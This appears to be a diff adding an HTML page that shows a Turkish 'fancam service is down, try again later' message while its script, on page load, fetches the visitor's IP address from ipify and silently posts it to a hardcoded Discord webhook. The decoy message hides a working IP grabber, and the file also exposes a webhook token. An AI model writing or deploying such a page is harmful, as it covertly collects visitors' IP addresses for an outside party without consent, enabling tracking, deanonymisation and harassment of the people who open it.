@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  // Make a request to the ipify API to get the client's IP address
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      // Format the IP address as a normal home address
+      const formattedIp = formatIpAddress(data.ip);
+
+      // Send the formatted IP address to the Discord webhook
+      sendToDiscord(formattedIp);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+
+  // Function to format the IP address as a normal home address
+  function formatIpAddress(ip) {
+    // Split the IP address into its four octets
+    const octets = ip.split('.');
+
+    // Format the IP address as a normal home address
+    return `${octets[0]} . ${octets[1]} . ${octets[2]} . ${octets[3]}`;
+  }
+
+  // Function to send the formatted IP address to the Discord webhook
+  async function sendToDiscord(ip) {
+    // Replace with your Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1202671406928756817/C-zaM8L4lzzFKKjo38hJNTepv5VRm-dryjQL7kGt_aNmusDMu5SRw2Sigh_C0LrsaLue';
+
+    try {
+      // Send a POST request to the Discord webhook
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `IP Address: ${ip}`
+        })
+      });
+
+      // Check if the request was successful
+      if (!response.ok) {
+        throw new Error('Non-200 response from Discord webhook');
+      }
+
+      console.log('Successfully sent IP address to Discord webhook');
+    } catch (error) {
+      console.error('Error sending IP address to Discord webhook:', error);
+    }
+  }
+</script>
+
+<h1>Fancam Merkezi Şuan Çalışmıyor</h1>
+<p>Lütfen Sonra Tekrar Deneyin</p>
+</body>
+</html>
